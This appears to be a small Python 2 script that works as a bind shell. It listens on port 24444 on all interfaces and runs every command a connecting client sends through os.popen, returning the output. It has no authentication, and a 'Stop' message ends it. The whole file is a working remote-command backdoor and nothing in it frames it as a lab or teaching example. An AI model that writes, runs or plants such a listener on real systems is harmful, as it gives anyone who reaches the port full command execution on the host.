#!/usr/bin/python
import threading
import sys
from socket import *
from os import popen

nPORT = 24444
nIP = "10.0.0.44"
tSTOP = threading.Event()

def Get(client,data):
	data[0] = client.recv(4096)
	print "> ",data[0], "\n"

def Send(client,data):
	Answer = popen(data[0]).read()
	print Answer
	client.sendall(Answer)

def DoCMD(client):
	cmData = client.recv(4096)
	print "> ",cmData, "\n"
	if cmData != "Stop":
		Answer = popen(cmData).read()
	else:
		Answer = "EXITING..."
	print ">>> ", Answer, "\n\n"
	client.sendall(Answer)
	client.close()
	
	if cmData == "Stop": tSTOP.set()

	
#########################################################
# Main Program
	
server = socket(AF_INET,SOCK_STREAM)    # select socket type
server.bind(("0.0.0.0",nPORT))          # "" = 0.0.0.0  23 is the port number
server.listen(100)                      # 100 clients welcome :)

while not tSTOP.isSet() :
	mClient,addr = server.accept()      # server accept the session here 
										# the code will wait until someone connect
	threading.Thread(target=DoCMD,args=(mClient,)).start()	
	print addr
	tSTOP.wait(0.3)

#	Get(mClient, dData)
#	print dData[0]+"\n"
#	if dData[0] != "Stop":
#		Send(mClient, dData) 
#	else:
#		print "STOPING....\n"
#		break

print "Closing............\n\n"

server.close()                          # server close
